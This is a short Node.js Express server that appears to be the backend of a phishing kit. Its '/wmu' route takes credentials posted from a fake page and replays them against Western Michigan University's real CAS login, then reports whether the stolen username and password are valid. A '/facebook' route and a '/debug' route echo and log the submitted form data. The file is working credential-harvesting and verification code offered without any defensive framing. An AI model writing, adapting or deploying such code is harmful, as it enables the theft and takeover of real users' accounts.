const express = require('express');
// const request = require('request');
var needle = require('needle');
const bodyParser = require('body-parser');
const app = express();
const port = 80;

// parse application/x-www-form-urlencoded
app.use(bodyParser.urlencoded({ extended: false }));

// parse application/json
app.use(bodyParser.json());

// Routes & Information Hanlder
app.post('/facebook', function (req, res) {
    res.send(req.body);
});

// Routes & Information Hanlder
app.post('/wmu', function (req, res) {
    // DEBUG
    // needle.post('localhost/debug', req.body)
    
    // Verify that the user is logged out ;)
    needle.get('https://webauth.wmich.edu/cas-web/logout');
    
    // Attempt to log user in...
    needle.post('https://webauth.wmich.edu/cas-web/login', req.body, function (err, needleResponse) {
        // DEBUG
        // console.log(err || needleResponse.body);
        // console.log(needleResponse.body);

        if (needleResponse.body.search("interruptions") == -1) {
            res.send("Credentials are Correct")
        } else if (needleResponse.body.search("interruptions") > 0) {
            res.send("Credentials are not Correct")
        }

        // DEBUG
        // res.send(err || needleResponse.body);
    });
});

app.post('/debug', function (req, res) {
    console.log(req.body);
    res.send(req.body);
});

// Serve Static Files
app.use('/', express.static('public'));
app.listen(port, () => console.log(`Server Listening on http://localhost:${port}!`));